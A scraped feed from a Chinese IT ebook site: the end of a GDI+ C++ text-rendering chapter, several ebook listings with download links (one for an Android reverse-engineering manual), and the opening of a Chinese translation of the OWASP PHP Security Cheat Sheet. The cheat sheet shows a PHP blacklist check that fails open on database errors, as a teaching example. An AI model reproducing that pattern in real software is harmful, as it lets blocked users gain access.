<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Graphics graph(pDC-&#38;gt;m_hDC); &#10;CString str = L&#34;&#32441;&#29702;&#23383;&#31526;&#20018;&#34;; &#10;Font font(L&#34;&#21326;&#25991;&#26032;&#39759;&#34;, 140);&#10;TextureBrush textureBrush(&#38;Image(L&#34;&#24352;&#19996;&#20581;.bmp&#34;));&#10;graph.DrawString(str, str.GetLength(), &#38;font, PointF(10.0f, 10.0f), &#38;textureBrush);</span><br></pre></td></tr></table></figure>
<p><img src="../img/gdip-编程基础/Image_072.jpg" alt="image"></p>
<p>图 14-45 纹理字</p>
<p>（4）渐变字</p>
<p>当然，也可以利用线性渐变刷来绘制色彩变幻的字符串。例如，使用前面的多色渐变刷 代码，可以得到很好的变色效果（参见图 14-46）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Graphics graph(pDC-&#38;gt;m_hDC); &#10;CString str = L&#34;&#39068;&#33394;&#28176;&#21464;&#23383;&#31526;&#20018;&#34;; &#10;Font font(L&#34;&#21326;&#25991;&#26032;&#39759;&#34;, 100);&#10;Color cols[] = &#123;Color::Red, Color::Orange, Color::Yellow, Color::Green, Color::Cyan, Color::Blue, Color::Purple, Color::Magenta&#125;;&#10;REAL bps[] = &#123;0.0f, 0.15f, 0.3f, 0.45f, 0.6f, 0.75f, 0.875f, 1.0f&#125;;&#10;LinearGradientBrush brush(Point(10, 10), Point(810, 10), Color::Black, Color::White);&#10;brush.SetInterpolationColors(cols, bps, 8); &#10;graph.DrawString(str, str.GetLength(), &#38;font, PointF(10.0f, 10.0f), &#38;brush);</span><br></pre></td></tr></table></figure>
<p><img src="../img/gdip-编程基础/Image_073.jpg" alt="image"></p>
<p>图 14-46 渐变字</p>
<p>（5）空心字与彩心字</p>
<p>还可以利用 GDI+的路径和路径渐变刷，来绘制空心和彩心字符串。例如（参见图 14-47）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Graphics graph(pDC-&#38;gt;m_hDC); &#10;FontFamily ff(L&#34;&#38582;&#20070;&#34;); &#10;wchar_t str[] = L&#34;&#27979;&#35797;&#23383;&#31526;&#20018;&#34;;&#10;REAL emSize = 120; // UnitWorld &#10;graph.DrawString(str, -1, &#38;Font(L&#34;&#38582;&#20070;&#34;, emSize, FontStyleRegular, UnitWorld), PointF(0, 0),&#10;&#38;SolidBrush(Color::Green));&#10;GraphicsPath path, *pOutlinePath;&#10;path.AddString(str, -1, &#38;ff, FontStyleRegular, emSize, Point(0, 100), NULL); // 847 &#20010;&#28857;&#10;Pen pen(Color::Red); graph.DrawPath(&#38;pen, &#38;path); &#10;pOutlinePath = path.Clone(); &#10;pOutlinePath-&#38;gt;Outline(); &#10;PathGradientBrush pgBrush(pOutlinePath);&#10;int n = pOutlinePath-&#38;gt;GetPointCount(); // 1023 &#20010;&#28857;&#10;Color *cols = new Color[n];&#10;for (int i = 0; i &#38;lt; n; i++) &#10;    cols[i] = Color(rand() % 255, rand() % 255, rand() % 255);&#10;pgBrush.SetCenterColor(Color(rand() % 255, rand() % 255, rand() % 255)); &#10;pgBrush.SetSurroundColors(cols, &#38;n); &#10;graph.TranslateTransform(0.0f, 100.0f); &#10;graph.FillPath(&#38;pgBrush, &#38;path);</span><br></pre></td></tr></table></figure>
<p>中，由于彩心字用到了随机颜色，所以每次刷新时的颜色都不一样。</p>
<p><img src="../img/gdip-编程基础/Image_074.jpg" alt="image"></p>
<p>图 14-47 普通、空心和彩心字符串</p>
<h3 id="1-8-4_平滑处理与_ClearType_技术">1.8.4 平滑处理与 ClearType 技术</h3><p>为了提高文字的清晰度，需要对绘制的文本串进行平滑处理，防止在（特别是点阵）文 字被放大后出现明显的锯齿（马赛克 mosaic）现象。ClearType（清晰活字）是微软公司于 1999 年 4 月 7 日推出的一种图形显示技术，主要用于改善 LCD（Liquid Crystal Display，液 晶显示）显示器的显示效果，提高图形和文字的清晰度。</p>
<p>可以在 GDI+程序中，利用 Graphics 类的两个文本绘制提示（hint）方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TextRenderingHint GetTextRender ingHint(VOID) const; &#10;Status SetTextRenderingHint(TextRender ingHint newMode);</span><br></pre></td></tr></table></figure>
<p>来获取和设置文字绘制时的平滑处理方法。其中的枚举类型 TextRenderingHint 的定义为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typedef enum &#123;&#10;    TextRenderingHintSystemDefault = 0, // &#21516;&#31995;&#32479;&#24179;&#28369;&#26041;&#24335; &#10;    TextRenderingHintSingleBitPerPixelGr idFit = 1, // &#19981;&#28040;&#38191;&#40831;&#65292;&#32593;&#26684;&#21305;&#37197; &#10;    TextRenderingHintSingleBitPerPixel = 2, // &#19981;&#28040;&#38191;&#40831;&#65292;&#19981;&#32593;&#26684;&#21305;&#37197; &#10;    TextRenderingHintAntiAliasGridFit = 3, // &#28040;&#38191;&#40831;&#65292;&#32593;&#26684;&#21305;&#37197; &#10;    TextRenderingHintAntiAlias = 4, // &#38191;&#40831;&#65292;&#19981;&#32593;&#26684;&#21305;&#37197;&#10;    TextRenderingHintClearTypeGridFit = 5 // &#20351;&#29992; ClearType &#25216;&#26415;&#65292;&#19981;&#32593;&#26684;&#21305;&#37197;&#10;&#125; TextRenderingHint;</span><br></pre></td></tr></table></figure>
<p>这里的网格匹配（grid fit），主要是指在文本绘制时，通过调整字形的平直和垂直笔画的宽 度，以达到提高文字输出质量的一种方法。</p>
<p>例如（输出结果如图 14-48，为放大后的效果）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Graphics graph(pDC-&#38;gt;m_hDC);&#10;SolidBrush textBrush(Color::Black); &#10;Font font(L&#34;Arial&#34;, 16);&#10;CString str = L&#34;font smoothing&#34;; &#10;wchar_t buf[5];&#10;for (int i = 0; i &#38;lt; 6; i++) &#123;&#10;    _itow_s(i, buf, 5, 10); &#10;    graph.SetTextRenderingHint(TextRenderingHint(i)); &#10;    graph.DrawString(buf, -1, &#38;font, PointF(5.0f, 20.0f * i), &#38;textBrush);&#10;    graph.DrawString(str, str.GetLength(), &#38;font, PointF(30.0f, 20.0f * i), &#38;textBrush);&#10;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="../img/gdip-编程基础/Image_075.jpg" alt="image"></p>
<p>图 14-48 文字绘制时的平滑处理方式 细心的同学可能会发现，除了渐变和路径刷及平滑处理外，大多数文本输出功能，GDI</p>
<p>都有。而且 GDI 还可以以任意角度绘制文本串，但是 GDI+好像不能。其实，这可以利用 GDI+的矩阵变换来实现。矩阵变换的内容，会在后面的 14.2.8 小节介绍。</p>
<p>专用字体集</p>
<p>如果你想使用系统中还没有被安装的字体，有如下两种方法可供选择。</p>
<p>（1）手工安装字体</p>
<p>选择 Windows XP 操作系统的“../控制面板/字体”图标，启动“字体”程序； 然后再选择“文件/安装新字体”菜单项，打开“添加字体”对话框（参见图 14-49）；选择 字体所在的文件目录，会出现目录中所有字体的名称和类型列表；选中想安装的字体后，按 确定关闭对话框。这样，就完成了字体的安装工作。将字体装进系统后，就可以和其他已装 入字体一样正常使用了。</p>
<p><img src="../img/gdip-编程基础/Image_076.jpg" alt="image"></p>
<p>图 14-49 添加字体对话框</p>
<p>（2）使用专用字体集</p>
<p>与已安装字体集类 InstalledFontCollection 一 样 ， 专 用 （ 私 有 ） 字 体 集 类 PrivateFontCollection 也是字体集类 FontCollection 的派生类。</p>
<p>PrivateFontCollection 类只有一个构造一个空的字体集默认构造函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PrivateFontCollection(VOID);</span><br></pre></td></tr></table></figure>
<p>但是可用方法 AddFontFile 来向字体集中添加字体文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Status AddFontFile(const WCHAR* filename);</span><br></pre></td></tr></table></figure>
<p>将字体文件加入专用字体集后，我们就可以利用其父类的方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Status GetLastStatus(VOID);</span><br></pre></td></tr></table></figure>
<p>和 GetFamilyCount、GetFamilies 等，来判断装入是否成功、字体集中共有多少种字体、获 取指定数目的字体族 FontFamily 对象的数组（指针）。这些都与前面“显示当前系统已装入 的字体（族）名称”部分所讲的类似。包括用 FontFamily 类的 GetFamilyName 方法获取字 体名称，并用该名称来创建字体对象（使用带字体集参数的构造函数），最后绘制文本串。</p>
<p>下面的例子，使用汉鼎繁印篆和汉鼎繁特行两种专用字体，输出文本串“专用字体集： 字体名称”和诗句“三顾频烦天下计 两朝开济老臣心”（参见图 14-50）。这两种字体所对应的字体文件 HDZB_25.TTF 和 HDZB_16.TTF，已经放入我个人网页的资源子目录 res 中。</p>
<p>你也可以自己从网上下载其他字体文件来进行试验。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// &#35013;&#20837;&#19987;&#29992;&#23383;&#20307;&#25991;&#20214; &#10;PrivateFontCollection pfc; &#10;pfc.AddFontFile(L&#34;res\\HDZB_16.TTF&#34;);&#10;if(pfc.GetLastStatus() != Ok)&#10;&#123; &#10;    MessageBox(L&#34;&#35013;&#20837;&#23383;&#20307;&#25991;&#20214;&#20986;&#38169;&#65281;&#34;); &#10;    return; &#10;&#125; &#10;pfc.AddFontFile(L&#34;res\\HDZB_25.TTF&#34;);&#10;if(pfc.GetLastStatus() != Ok)&#10;&#123; &#10;    MessageBox(L&#34;&#35013;&#20837;&#23383;&#20307;&#25991;&#20214;&#20986;&#38169;&#65281;&#34;); &#10;    return; &#10;&#125; &#10;int n = pfc.GetFamilyCount();&#10;if (n &#38;lt; 2) &#10;&#123; &#10;    MessageBox(L&#34;&#23383;&#20307;&#38598;&#20013;&#30340;&#23383;&#20307;&#25968;&#19981;&#22815;&#65281;&#34;); &#10;    return; &#10;&#125;&#10;// &#33719;&#21462;&#23383;&#20307;&#26063;&#23545;&#35937;&#25968;&#32452; &#10;FontFamily ffs[2]; &#10;int found;&#10;pfc.GetFamilies(2, ffs, &#38;found);&#10;// &#23450;&#20041;&#36755;&#20986;&#23383;&#31526;&#20018;&#10;CString str0 = L&#34;&#19987;&#29992;&#23383;&#20307;&#38598;&#65306;&#34;, str;&#10;CString str1 = L&#34;&#19977;&#39038;&#39057;&#28902;&#22825;&#19979;&#35745;\r\n &#20004;&#26397;&#24320;&#27982;&#32769;&#33251;&#24515;&#34;;&#10;// &#35774;&#32622;&#20013;&#23545;&#40784;&#10;StringFormat stringFormat; &#10;stringFormat.SetAlignment(StringAlignmentCenter); &#10;RECT rect;&#10;GetClientRect(&#38;rect);&#10;// &#21019;&#24314;&#22270;&#24418;&#21644;&#25991;&#26412;&#21047;&#23545;&#35937;&#10;Graphics graph(pDC-&#62;m_hDC); &#10;SolidBrush textBrush(Color::Black);&#10;// &#33719;&#21462;&#23383;&#20307;&#21517;&#31216; 1&#65292;&#26500;&#36896;&#23383;&#20307; 1&#65292;&#24182;&#36755;&#20986;&#23383;&#31526;&#20018;&#10;wchar_t name[LF_FACESIZE]; &#10;ffs[0].GetFamilyName(name);&#10;Font font1(name, 60, FontStyleRegular, UnitPixel, &#38;pfc); &#10;str = str0 + name;&#10;graph.DrawString(str, str.GetLength(), &#38;font1, PointF(0.0f, 0.0f), &#38;textBrush);&#10;graph.DrawString(str1, str1.GetLength(), &#38;font1, &#10;    PointF(rect.right / 2.0f, 80.0f), &#38;stringFormat,&#10;    &#38;textBrush);&#10;// &#33719;&#21462;&#23383;&#20307;&#21517;&#31216; 2&#65292;&#26500;&#36896;&#23383;&#20307; 2&#65292;&#24182;&#36755;&#20986;&#23383;&#31526;&#20018; ffs[1].GetFamilyName(name);&#10;Font font2(name, 60, FontStyleRegular, UnitPixel, &#38;pfc); &#10;str = str0 + name;&#10;graph.DrawString(str, str.GetLength(), &#38;font2,&#10;    PointF(0.0f, 220.0f), &#38;textBrush); graph.DrawString(str1, str1.GetLength(), &#38;font2,&#10;    PointF(rect.right / 2.0f, 300.0f), &#38;stringFormat,&#10;    &#38;textBrush);</span><br></pre></td></tr></table></figure>
<p><img src="../img/gdip-编程基础/Image_077.jpg" alt="image"></p>
<p>图 14-50 使用汉鼎繁印篆和汉鼎繁特行专用字体</p>
<h2 id="复习思考题">复习思考题</h2><p>1. GDI+与 GDI 是什么关系？</p>
<p>2. GDI+有哪两种封装？它们的基础是什么？</p>
<p>3. GDI+有哪些新增功能？</p>
<p>4. GDI+的绘图方式与 GDI 有什么不同？</p>
<p>5. 用 MFC 编写 GDI+程序需要做那些装备工作？对 VC08 SP1 及 VC10 版有什么不同？</p>
<p>6. 如何对 GDI+进行初始化和清除？需要特别注意什么？</p>
<p>7. 怎么解决 GDI+编程中 new 操作符问题？</p>
<p>8. GDI+的几何辅助类与 GDI 的有哪些不同？</p>
<p>9. 与 GDI 相比，GDI+的颜色哪些新内容？</p>
<p>10. 有多少颜色枚举常量？如何使用它们？GDI+的 Graphics 类与 GDI 的 MFC 封装中的什么类相似？怎样创建 Graphics 对象？</p>
<p>13. GDI+的绘图方法属于哪个类？</p>
<p>14. GDI+的画线方法的名称都有什么共同的前缀？</p>
<p>15. GDI+的画直线、矩形和椭圆的方法与 GDI 的对应方法有哪些不同？</p>
<p>16. GDI+中的画填充图的方法都有什么共同的前缀？有例外吗？</p>
<p>17. GDI+画填充多边形有哪两种填充模式？它们的差别在哪里？</p>
<p>18. GDI+提供了哪两种由控制点列画曲线的方法？它们有什么差别？</p>
<p>19. GDI+中有专门的清屏方法吗？GDI 中有没有？</p>
<p>20. 与 GDI 相比，GDI+中的笔增加了哪些新功能？</p>
<p>21. GDI+的条纹刷和纹理刷与 GDI 相比有哪些新加内容？</p>
<p>22. GDI+新增加了哪些画刷种类？</p>
<p>23. GDI+中有哪些字体类？</p>
<p>24. 在 VC08 SP1 及 VC10 中直接使用 Font 类会出现什么编译错误？如何解决？</p>
<p>25. 在 GDI+中如何使用字体？</p>
<p>26. GDI+使用什么方法绘制文本？</p>
<p>27. 如何实现阴影、条纹、纹理、渐变、空心和彩心等绘制美术字效果？</p>
<p>28. 如何使用专用字体集？</p>
<h2 id="练习题">练习题</h2><p>1. （选做题，例子）实现本章中的各例。</p>
<p>2. （正叶曲线）编写一个画填充正叶曲线的通用程序。可以指定叶片数、颜色、圆心和叶长（半径）等。（参见 14.7.2 的 2．和图 14-31）</p>
<p>3. （阴阳八卦图）编写一个绘制阴阳八卦图的通用程序。可指定各种颜色、圆心和半径等 等，参见图 14-51。</p>
<p><img src="../img/gdip-编程基础/Image_078.jpg" alt="image"></p>
<p>图 14-51 阴阳八卦图</p>
<p>4. （选做题，交互绘图）编写一个使用 GDI+接口的交互式绘图程序，实现 GDI+的所有 基本功能和各种新增加的功能。（提示，可以用 GDI 交互移动，用 GDI+成图。）</p>
<p>5. （选做题，补充绘图方法）编写若干（带不同类型输入参数的）画（线框和填充）弓弦 和 圆 角 矩 形 的 GDI+ 方法 （ DrawChord 、 FillChord 、 DrawRoundRectangle 和 FillRoundRectangle）。</p>
<p>6. （选做题，色块）绘制颜色枚举常量色块图。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>GDI+（Graphics Device Interface Plus，图形设备接口加）是 Windows XP 及以上版本操 作系统的图形子系统，也是传统.NET 框架的重要组成部分和窗体绘图的主要工具，负责在 屏幕和打印机上绘制图形图像和显示信息。顾名思义，GDI+是 Windows 早期版本所提供的 图形设备接口 GDI 的后续版本，是建立在 GDI 之上的一个高层图形子系统。</p>
<p>GDI+是一种 API，分别通过一套 C++类和一套部署为托管代码的类来展现，这两套类 分别被称为 GDI+的“C++封装”和“托管类接口”。</p>
<p>GDI+不但在功能上比 GDI 要强大很多，而且在代码编写方面也更简单，因此会成为 Windows 图形图像程序开发的主要工具之一。由于篇幅所限，本书只简单介绍利用 MFC 进 行 GDI+编程的一些基本内容，也不讲 GDI+的 API 编程。基于 GDI+托管封装的.NET 窗体 绘图，将在第 18 章中再介绍。对 GDI+编程有兴趣的读者，可以参考如下图书：</p>
<ul>
<li><p>周鸣杨、赵景亮. 精通 GDI+编程. 清华大学出版社，2004 年 2 月（C++ / MFC）。</p>
</li>
<li><p>Mahesh Chand（韩江等译）. GDI+图形程序设计. 电子工业出版社，2005 年 3 月（C# / .NET）。</p>
</li>
</ul>
<p>本章将介绍 GDI+的结构和组成，讨论 GDI+的几个主要新增特性与功能，说明 GDI+给 Windows 图形图像程序的开发模式带来的变化。介绍 C++封装的 GDI+ API 的具体使用方法， 主要讲解二维矢量图形绘制和文字显示等基本内容。]]>
    
    </summary>
    
      <category term="cpp" scheme="http://it-ebooks.flygon.net/tags/cpp/"/>
    
      <category term="gdip" scheme="http://it-ebooks.flygon.net/tags/gdip/"/>
    
      <category term="mfc" scheme="http://it-ebooks.flygon.net/tags/mfc/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[android 逆向菜鸟速参手册（完蛋版）]]></title>
    <link href="http://it-ebooks.flygon.net/android-%E9%80%86%E5%90%91%E8%8F%9C%E9%B8%9F%E9%80%9F%E5%8F%82%E6%89%8B%E5%86%8C/"/>
    <id>http://it-ebooks.flygon.net/android-逆向菜鸟速参手册/</id>
    <published>2016-02-24T03:32:30.000Z</published>
    <updated>2016-02-24T03:36:39.838Z</updated>
    <content type="html"><![CDATA[<p><img src="http://attach.52pojie.cn/forum/201412/19/145917zj535lsh0lj45ons.jpg" alt=""></p>
<p>格式：PDF</p>
<p>手册整理者：PeterDocter or PeterChen[FCG] </p>
<p>手册整理：2014-12-18 20:30 </p>
<p>本逆向手册，一切教程来源至网络。我只是搬运工与装修工。。。 </p>
<a id="more"></a>
<h2 id="下载">下载</h2><ul>
<li><a href="http://pan.baidu.com/s/1c0kyazA" target="_blank" rel="external">百度云下载</a> 密码：kfac</li>
<li><a href="http://vdisk.weibo.com/s/aADaW4YRjr5dM" target="_blank" rel="external">微盘下载</a></li>
<li><a href="http://1000eb.com/1ix8i" target="_blank" rel="external">千易下载</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p><img src="http://attach.52pojie.cn/forum/201412/19/145917zj535lsh0lj45ons.jpg" alt=""></p>
<p>格式：PDF</p>
<p>手册整理者：PeterDocter or PeterChen[FCG] </p>
<p>手册整理：2014-12-18 20:30 </p>
<p>本逆向手册，一切教程来源至网络。我只是搬运工与装修工。。。 </p>]]>
    
    </summary>
    
      <category term="android" scheme="http://it-ebooks.flygon.net/tags/android/"/>
    
      <category term="逆向" scheme="http://it-ebooks.flygon.net/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[程序设计思想与方法]]></title>
    <link href="http://it-ebooks.flygon.net/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%80%9D%E6%83%B3%E4%B8%8E%E6%96%B9%E6%B3%95/"/>
    <id>http://it-ebooks.flygon.net/程序设计思想与方法/</id>
    <published>2016-02-22T12:23:22.000Z</published>
    <updated>2016-02-22T12:24:29.611Z</updated>
    <content type="html"><![CDATA[<p><img src="https://ek8whxe.cloudimg.io/s/width/226/https://www.gitbook.com/cover/book/wizardforcel/sjtu-cs902-courseware.jpg?build=1439249362341&amp;v=12.0.2" alt=""></p>
<p>作者：陆朝俊</p>
<a id="more"></a>
<h2 id="在线阅读">在线阅读</h2><ul>
<li><a href="https://www.gitbook.com/book/wizardforcel/sjtu-cs902-courseware/details" target="_blank" rel="external">在线阅读</a></li>
</ul>
<h2 id="下载">下载</h2><ul>
<li><a href="https://www.gitbook.com/download/pdf/book/wizardforcel/sjtu-cs902-courseware" target="_blank" rel="external">PDF格式</a></li>
<li><a href="https://www.gitbook.com/download/epub/book/wizardforcel/sjtu-cs902-courseware" target="_blank" rel="external">EPUB格式</a></li>
<li><a href="https://www.gitbook.com/download/mobi/book/wizardforcel/sjtu-cs902-courseware" target="_blank" rel="external">MOBI格式</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p><img src="https://ek8whxe.cloudimg.io/s/width/226/https://www.gitbook.com/cover/book/wizardforcel/sjtu-cs902-courseware.jpg?build=1439249362341&amp;v=12.0.2" alt=""></p>
<p>作者：陆朝俊</p>]]>
    
    </summary>
    
      <category term="python" scheme="http://it-ebooks.flygon.net/tags/python/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[深入浅出MFC]]></title>
    <link href="http://it-ebooks.flygon.net/jjhou-mfc/"/>
    <id>http://it-ebooks.flygon.net/jjhou-mfc/</id>
    <published>2016-02-21T13:21:27.000Z</published>
    <updated>2016-02-21T13:23:01.909Z</updated>
    <content type="html"><![CDATA[<p><img src="https://ek8whxe.cloudimg.io/s/width/226/https://www.gitbook.com/cover/book/wizardforcel/jjhou-mfc.jpg?build=1451985303017&amp;v=12.0.2" alt=""></p>
<p>作者：侯捷</p>
<a id="more"></a>
<h2 id="在线阅读">在线阅读</h2><ul>
<li><a href="https://www.gitbook.com/book/wizardforcel/jjhou-mfc/details" target="_blank" rel="external">在线阅读</a></li>
</ul>
<h2 id="下载">下载</h2><ul>
<li><a href="https://www.gitbook.com/download/pdf/book/wizardforcel/jjhou-mfc" target="_blank" rel="external">PDF格式</a></li>
<li><a href="https://www.gitbook.com/download/epub/book/wizardforcel/jjhou-mfc" target="_blank" rel="external">EPUB格式</a></li>
<li><a href="https://www.gitbook.com/download/mobi/book/wizardforcel/jjhou-mfc" target="_blank" rel="external">MOBI格式</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p><img src="https://ek8whxe.cloudimg.io/s/width/226/https://www.gitbook.com/cover/book/wizardforcel/jjhou-mfc.jpg?build=1451985303017&amp;v=12.0.2" alt=""></p>
<p>作者：侯捷</p>]]>
    
    </summary>
    
      <category term="cpp" scheme="http://it-ebooks.flygon.net/tags/cpp/"/>
    
      <category term="mfc" scheme="http://it-ebooks.flygon.net/tags/mfc/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Java 8 教程汇总]]></title>
    <link href="http://it-ebooks.flygon.net/java8-tutorials/"/>
    <id>http://it-ebooks.flygon.net/java8-tutorials/</id>
    <published>2016-02-18T13:14:35.000Z</published>
    <updated>2016-02-18T13:15:54.392Z</updated>
    <content type="html"><![CDATA[<p><img src="https://ek8whxe.cloudimg.io/s/width/226/https://www.gitbook.com/cover/book/wizardforcel/java8-tutorials.jpg?build=1450929768303&amp;v=12.0.2" alt=""></p>
<a id="more"></a>
<h2 id="在线阅读">在线阅读</h2><ul>
<li><a href="https://www.gitbook.com/book/wizardforcel/java8-tutorials/details" target="_blank" rel="external">在线阅读</a></li>
</ul>
<h2 id="下载">下载</h2><ul>
<li><a href="https://www.gitbook.com/download/pdf/book/wizardforcel/java8-tutorials" target="_blank" rel="external">PDF格式</a></li>
<li><a href="https://www.gitbook.com/download/epub/book/wizardforcel/java8-tutorials" target="_blank" rel="external">EPUB格式</a></li>
<li><a href="https://www.gitbook.com/download/mobi/book/wizardforcel/java8-tutorials" target="_blank" rel="external">MOBI格式</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p><img src="https://ek8whxe.cloudimg.io/s/width/226/https://www.gitbook.com/cover/book/wizardforcel/java8-tutorials.jpg?build=1450929768303&amp;v=12.0.2" alt=""></p>]]>
    
    </summary>
    
      <category term="java" scheme="http://it-ebooks.flygon.net/tags/java/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Kotlin 中文参考]]></title>
    <link href="http://it-ebooks.flygon.net/kotlin-ref-zh/"/>
    <id>http://it-ebooks.flygon.net/kotlin-ref-zh/</id>
    <published>2016-02-18T11:01:03.000Z</published>
    <updated>2016-02-18T11:08:05.304Z</updated>
    <content type="html"><![CDATA[<p><img src="https://ek8whxe.cloudimg.io/s/width/226/https://www.gitbook.com/cover/book/huanglizhuo/kotlin-in-chinese.jpg?build=1425805982556&amp;v=12.0.2" alt=""></p>
<p>译者：<a href="https://github.com/huanglizhuo" target="_blank" rel="external">huanglizhuo</a></p>
<p>来源：<a href="https://github.com/huanglizhuo/kotlin-in-chinese" target="_blank" rel="external">kotlin-in-chinese</a></p>
<a id="more"></a>
<h2 id="在线阅读">在线阅读</h2><ul>
<li><a href="https://www.gitbook.com/book/huanglizhuo/kotlin-in-chinese/details" target="_blank" rel="external">在线阅读</a></li>
</ul>
<h2 id="下载">下载</h2><ul>
<li><a href="https://www.gitbook.com/download/pdf/book/huanglizhuo/kotlin-in-chinese" target="_blank" rel="external">PDF格式</a></li>
<li><a href="https://www.gitbook.com/download/epub/book/huanglizhuo/kotlin-in-chinese" target="_blank" rel="external">EPUB格式</a></li>
<li><a href="https://www.gitbook.com/download/mobi/book/huanglizhuo/kotlin-in-chinese" target="_blank" rel="external">MOBI格式</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p><img src="https://ek8whxe.cloudimg.io/s/width/226/https://www.gitbook.com/cover/book/huanglizhuo/kotlin-in-chinese.jpg?build=1425805982556&amp;v=12.0.2" alt=""></p>
<p>译者：<a href="https://github.com/huanglizhuo">huanglizhuo</a></p>
<p>来源：<a href="https://github.com/huanglizhuo/kotlin-in-chinese">kotlin-in-chinese</a></p>]]>
    
    </summary>
    
      <category term="kotlin" scheme="http://it-ebooks.flygon.net/tags/kotlin/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[PHP Security Cheatsheet 中文版]]></title>
    <link href="http://it-ebooks.flygon.net/php-security-cheat-sheet/"/>
    <id>http://it-ebooks.flygon.net/php-security-cheat-sheet/</id>
    <published>2016-02-17T14:39:32.000Z</published>
    <updated>2016-02-18T01:32:33.930Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>译者：<a href="https://github.com/fisherMartyn" target="_blank" rel="external">fisherMartyn</a></p>
<p>来源：<a href="https://github.com/fisherMartyn/PHP-SECURITY-CHEAT-SHEET" target="_blank" rel="external">PHP-SECURITY-CHEAT-SHEET</a></p>
</blockquote>
<h1 id="介绍">介绍</h1><p>这篇博客是翻译自OWSAP的<a href="https://www.owasp.org/index.php/PHP_Security_Cheat_Sheet" target="_blank" rel="external">PHP Security Cheat Sheet</a>，你可以查看原文。</p>
<p>本文章的目的是提供基本的PHP安全建议，主要针对开发者和系统管理员。需要注意的是这里提到的安全建议可能并不足已支撑安全的网络应用，而只是一个组成部分。<a id="more"></a></p>
<h2 id="PHP介绍">PHP介绍</h2><p>根据W3 Techs的统计，PHP是最流行的Server端编程语言，大约81.8%的Web Server用PHP部署(任何语言都要为自己吹一把的)。</p>
<p>与其它语言不同，PHP即是一门语言，也是一个web框架，在PHP语言中内嵌了典型的web框架的特性。跟其它语言一样，PHP背后也有庞大的社区软件库，贡献了PHP安全和其它各个方面的特性。所有的这三个方面（语言、框架和开源库）都是在构建安全的web应用中需要考虑的因素。</p>
<p>PHP一直在发展中，而不是固定的设计，因此你很可能写出了不安全的PHP程序。为了让应用更安全，你需要了解所有的陷阱。</p>
<h3 id="语言相关">语言相关</h3><h4 id="弱类型">弱类型</h4><p>PHP是弱类型的，意味着不正确的数据类型会被自动转换。这个特性经常会隐藏开发中的错误信息或者不规范数据的注入，导致系统风险性增加。(例子在下面的输入处理部分)。</p>
<p>尽量使用非类型转换的函数和操作符(例如用===替换==)。但并非所有的操作符都有严格类型检查的版本（例如&lt;=和&gt;=），另外很多内置的函数(例如in_array)默认进行类型转换，给编写安全的代码带来了挑战。</p>
<h4 id="异常和错误处理">异常和错误处理</h4><p>几乎所有的PHP内置函数很多PHP库，不支持异常，而是用其它的报警机制(例如notice)，允许出错的代码继续运行。这也会隐藏很多bug。很多其它的语言、大部分高级语言，相对于PHP，开发者代码错误或者开发者未处理的运行时错误，都会导致程序停止执行，从而保护程序。</p>
<p>考虑下面的程序，程序的目的是检查一个username是不是在数据库的黑名单中，以限制访问。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$db_link = mysqli_connect(&#39;localhost&#39;, &#39;dbuser&#39;, &#39;dbpassword&#39;, &#39;dbname&#39;);&#10;&#10;function can_access_feature($current_user) &#123;&#10;   global $db_link;&#10;   $username = mysqli_real_escape_string($db_link, $current_user-&#62;username);&#10;   $res = mysqli_query($db_link, &#34;SELECT COUNT(id) FROM blacklisted_users WHERE username = &#39;$username&#39;;&#34;);&#10;   $row = mysqli_fetch_array($res);&#10;   if ((int)$row[0] &#62; 0) &#123;&#10;       return false;&#10;   &#125; else &#123;&#10;       return true;&#10;   &#125;&#10;&#125;&#10;&#10;if (!can_access_feature($current_user)) &#123;&#10;   exit();&#10;&#125;&#10;// Code for feature here</span><br></pre></td></tr></table></figure>
<p>上面的代码可能产生各种各样的运行时错误，例如由于用户名和密码错误或者数据库server宕机可能导致的数据库连接失败、或者连接可能被server断开。在上述情况下，<code>mysqli</code>函数会抛出notice或者warnings，但不会抛出异常或者fatal error，代码会继续执行。变量<code>$row</code>会成为<code>NULL</code>，基于若类型转换<code>(int)$row[0]</code>会成为0，最终<code>can_access_feature</code>会返回<code>true</code>，用户会获得访问权限，不管用户是否在黑名单中。</p>
